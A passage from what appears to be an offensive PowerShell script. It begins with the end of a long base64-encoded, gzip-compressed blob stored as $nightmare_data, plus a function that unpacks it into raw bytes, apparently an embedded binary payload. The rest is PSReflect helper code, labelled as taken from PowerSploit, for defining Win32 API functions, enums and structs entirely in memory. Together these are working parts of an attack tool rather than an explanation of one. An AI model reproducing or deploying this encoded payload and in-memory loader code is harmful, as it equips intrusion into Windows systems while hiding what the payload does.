vGUTq+nYqqmZiLTMn2Z9umYrulhdmd/Dud4TufXczFXczOTeZm/zPt8zNeMS4czn4UsZil7zQpWsYYRtrAvbGcHu9gDd7nPQx7zlL/mBa94wwlf+Be+84NfHJceODCXIYON7OSR/KSNwJuAOANzPpSgrsHdgpyBfR
sehxPsN+gdWoKpBhVOnAOeG0QOmDxQBeCKQJaALQNdDr5yamQriWRykav8Ije5y0d5yFNe8pYPylGu8pSvAhWqSMUqUanK1GuVq0KVqlK1alSriGJqUav6oja1q0d1qEvd6kE72tWe9nWgQx3pWCc61Zl+rXNd6FJ
XutaNbjXRTC961V/0pnf9qA996kvf+sE4xjWe8U1gQhOZ2CTm4cdO0A7y8VjAIpawjOWsZDVrGWMr29gjO9nNHO7xgEc84RnPeclr3nLGV77xR37ymzvCE4GIRCIykYtS1KIVTKxiE4/iFLdwpCcDGclEZjKXpayR
EkNCG9I5kYyDVAIkkiCNHEnUSIEhgQ30J9gdcAdgTsCbg7UGJwPjBr4TbI7xQBWBKDO5KU1tWsPMajbzaE5zG8d6NrCRTWxmc1va2raW2dVu9tGe9rY/57uvuHWIRwISkYRkJCclqUlLGFnJhvac5CZO53VBF3VJl
3V5V3Z113asW7ute+zO7u6c3uuDPoJtWZ/Dtrpv4drab/Dt7O/eGbwhQAMTtA/dQ/NatG792Tp0zqEeDWhEE5rRnJa0pi1ldKUbfaQnvakzemMwRmMyZmM+luhmO7JxHbfxcTzRT2fy0MwIrfy+/Re/3bFuCzjfwP
ml/9LvsP76B7x3hS9CEYtUvBaFqEQjiFjEF7GLQ1wCm8WlL0MZy1S+loWsZANrFxi7w9YLprqwNIShKewsYGYDKxcYuf+w8UG78DCEgyn8K+BeA+8WOLfDtwuuufAshGOpeW0KU5nGELOYL2Y3h7nMg3Wtb0Mb29S
+toWtbGOJXewXu9vDXvbhx6Tl//gz2yU+CUlMUvKaFKQiDSEEj8c/P88ZMt2mdM6RYokcvx93+vL7y9AGB01IMC+1SH7F827k7rMAuUZINkG2GdKF78i3RsItMmZI+eH/+CvGN9UDGzcAbgEA")

    $nightmare_ms = New-Object System.IO.MemoryStream -ArgumentList @(,$nightmare_data)
    $ms = New-Object System.IO.MemoryStream
    $gzs = New-Object System.IO.Compression.GZipStream -ArgumentList @($nightmare_ms, [System.IO.Compression.CompressionMode]::Decompress)
    $gzs.CopyTo($ms)
    $gzs.Close()
    $nightmare_ms.Close()

    return $ms.ToArray()
}

########################################################
# Stolen from PowerSploit: https://github.com/PowerShellMafia/PowerSploit
########################################################

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS
Creates an in-memory assembly and module
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.
.PARAMETER ModuleName
Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.
.EXAMPLE
$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}

function Add-Win32Type
{
<#
.SYNOPSIS
Creates a .NET type for an unmanaged Win32 function.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func
.DESCRIPTION
Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).
The 'func' helper function can be used to reduce typing when defining
multiple function definitions.
.PARAMETER DllName
The name of the DLL.
.PARAMETER FunctionName
The name of the target function.
.PARAMETER EntryPoint
The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.
.PARAMETER ReturnType
The return type of the function.
.PARAMETER ParameterTypes
The function parameters.
.PARAMETER NativeCallingConvention
Specifies the native calling convention of the function. Defaults to
stdcall.
.PARAMETER Charset
If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.
.PARAMETER SetLastError
Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.
.PARAMETER Module
The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER Namespace
An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
.NOTES
Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS
Creates an in-memory enumeration for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.
.PARAMETER Module
The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the enum.
.PARAMETER Type
The type of each enum element.
.PARAMETER EnumElements
A hashtable of enum elements.
.PARAMETER Bitfield
Specifies that the enum should be treated as a bitfield.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS
Creates an in-memory struct for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
.DESCRIPTION
The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.
One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.
.PARAMETER Module
The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER FullName
The fully-qualified name of the struct.
.PARAMETER StructFields
A hashtable of fields. Use the 'field' helper function to ease
defining each field.
.PARAMETER PackingSize
Specifies the memory alignment of fields.
.PARAMETER ExplicitLayout
Indicates that an explicit offset for each field will be specified.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}
$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}
# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout
.NOTES
PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}
